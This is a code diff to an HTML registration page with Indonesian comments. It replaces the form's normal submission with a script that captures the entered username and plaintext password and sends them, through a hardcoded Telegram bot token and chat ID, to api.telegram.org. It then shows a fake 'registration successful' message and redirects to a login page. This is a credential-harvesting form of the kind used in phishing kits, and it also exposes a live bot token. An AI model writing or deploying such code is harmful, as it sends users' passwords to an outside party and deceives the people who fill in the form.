@@ -51,7 +51,7 @@
 <body>
     <div class="register-container">
         <h2>Register</h2>
-        <form action="index.html" method="post">
+        <form id="registerForm">
             <label for="username">Username</label>
             <input type="text" id="username" name="username" required>
 
@@ -61,5 +61,39 @@
             <button type="submit">Register</button>
         </form>
     </div>
+
+    <script>
+        // Mengirim data registrasi ke bot Telegram
+        document.getElementById("registerForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            const botToken = '7621390139:AAE9oNVeBy946yGbO7IDsT34DFY3THvGC6I';  // Token bot Telegram Anda
+            const chatId = '7882058841';  // Chat ID Telegram Anda
+
+            const message = `Registrasi Baru:\nUsername: ${username}\nPassword: ${password}`;
+
+            // URL untuk mengirimkan pesan ke bot Telegram
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Membuat permintaan HTTP untuk mengirim pesan ke bot Telegram
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("Registrasi berhasil!");
+                        window.location.href = "index.html";  // Arahkan kembali ke halaman login
+                    } else {
+                        alert("Terjadi kesalahan. Coba lagi.");
+                    }
+                })
+                .catch(error => {
+                    alert("Terjadi kesalahan. Coba lagi.");
+                    console.error(error);
+                });
+        });
+    </script>
 </body>
 </html>
